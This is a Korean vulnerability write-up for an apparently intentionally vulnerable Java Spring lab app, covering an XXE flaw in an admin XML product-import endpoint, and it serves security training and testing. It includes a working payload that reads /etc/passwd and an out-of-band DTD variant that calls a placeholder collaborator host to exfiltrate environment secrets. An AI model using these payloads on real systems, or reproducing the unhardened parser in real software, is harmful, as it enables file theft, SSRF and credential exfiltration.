# VULN-020 XML 상품 임포트 XXE

- 대상 스택: java-spring
- 심각도: High
- 분류: A05:2021 Security Misconfiguration (XXE, CWE-611)

## 위치

`apps/java-spring/.../controller/CatalogImportController.java`, `POST /api/admin/products/import` (`Content-Type: application/xml`, 관리자 전용) — 상품 XML 피드 일괄 등록 기능. `DocumentBuilderFactory.newInstance()` 를 아무 강화(`disallow-doctype-decl`, 외부 일반/파라미터 엔티티 비활성화, `XMLConstants.FEATURE_SECURE_PROCESSING`) 없이 사용해 `builder.parse()`.

파싱한 `<product><name>` 값을 응답(`imported[].name`)에 되돌려주고 DB에도 저장 → 엔티티 확장 결과가 그대로 노출.

## 트리거 방법

```
POST /api/java/admin/products/import
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE catalog [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<catalog><product><name>&xxe;</name><price>1</price></product></catalog>
```

응답 `imported[0].name` 에 `/etc/passwd` 내용이 그대로 반환된다(255자 초과분은 DB 저장 시 잘리지만 응답의 `name` 은 전체 확장 결과).

- 직접 읽기: `file:///etc/passwd`, `file:///etc/hostname`, 앱 소스/설정 등 XML 로 유효한 텍스트 파일.
- `file:///proc/self/environ` 은 NUL 구분자 때문에 직접 확장 시 파서 오류 → 시크릿(`TOSS_SECRET_KEY`)은 OOB 로: `<!DOCTYPE r [<!ENTITY % p SYSTEM "http://<collab>/x.dtd"> %p;]>` + 외부 DTD 의 파라미터 엔티티로 base64 감싸 exfil. 이 경로는 SSRF(내부망 요청)도 동시에 입증.

## 영향

- WAS 프로세스 권한으로 임의 텍스트 파일 읽기, 내부망 SSRF, 파라미터 엔티티 블라인드 exfil(환경변수 포함).
- 관리자 세션 필요(시드 `admin/admin`) 또는 VULN-013 로 권한 상승 후 접근.

## 증거 (재현 확인)

(진단 단계에서 채움) `file:///etc/passwd` 페이로드 → 응답 `imported[0].name` 에 `root:x:0:0:root:/root:/bin/bash ...` 전체. OOB DTD → Collaborator 로 `TOSS_SECRET_KEY`.

## 조치 상태: 미조치 (의도된 취약점)

정상 구현: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` (또는 `setExpandEntityReferences(false)` + 외부 엔티티 비활성화), 가능하면 XML 대신 JSON 임포트.
